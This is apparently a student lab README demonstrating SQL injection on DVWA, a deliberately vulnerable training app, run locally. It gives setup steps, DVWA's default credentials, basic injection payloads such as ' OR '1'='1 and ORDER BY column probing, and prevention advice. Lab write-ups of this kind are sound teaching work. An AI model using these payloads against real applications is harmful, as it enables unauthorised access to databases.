# SQL-Injection-on-DVWA 
# 🔐 SQL Injection on DVWA (Low Security)

## 📌 Objective

The objective of this project is to demonstrate a **SQL Injection vulnerability** using **DVWA (Damn Vulnerable Web Application)** with security level set to **Low**. This shows how improper input validation can allow attackers to access sensitive data.

---

## 🧰 Tools Used

* DVWA (Damn Vulnerable Web Application)
* Kali Linux
* Web Browser (Chrome/Firefox)

---

## ⚙️ Setup Instructions

1. Use Kali Linux.
2. Download DVWA and place it inside the `htdocs` folder.
3. Start **Apache** and **MySQL** services.
4. Open browser and go to:

   ```
   http://127.0.0.1/dvwa
   ```
5. Configure database via `setup.php`.
6. Login using default credentials:

   * Username: `admin`
   * Password: `password`

---

## 🔧 Configuration

* Navigate to **DVWA Security**
* Set security level to:

  ```
  Low
  ```

---

## 🚀 Steps to Perform SQL Injection

1. Go to **SQL Injection** module in DVWA.
2. Enter payloads in the **User ID** field.

### 🔑 Payload Examples

#### 1. Normal Input
# Get data of user with id = 1 
```
1
```

#### 2. Basic Injection
# Retuns true and gives until give error
```
1' OR '1'='1
```

#### 3. Get All Records

```
1' OR 1=1 #
```

#### 4. Find Number of Columns

```
1' ORDER BY 1 #
1' ORDER BY 2 #
```

---

## 📸 Outputs

# various payload inputs gives diff user data
outputs are attached 
---

## ⚠️ Vulnerability Explanation

SQL Injection occurs when user input is directly used in SQL queries without validation.

### Example Query:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

### After Injection:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

👉 This makes the condition always true, allowing unauthorized access to data.

---

## 🛡️ Prevention Techniques

* Use **Parameterized Queries**
* Validate user input
* Use ORM frameworks
* Apply least privilege to database accounts
* Use Web Application Firewall (WAF)

---


## 🧠 Conclusion

This project demonstrates how weak input validation leads to **SQL Injection vulnerabilities**, allowing attackers to manipulate database queries and access sensitive information.

---

## 📚 References

* OWASP SQL Injection Guide
* DVWA Official Documentation

---
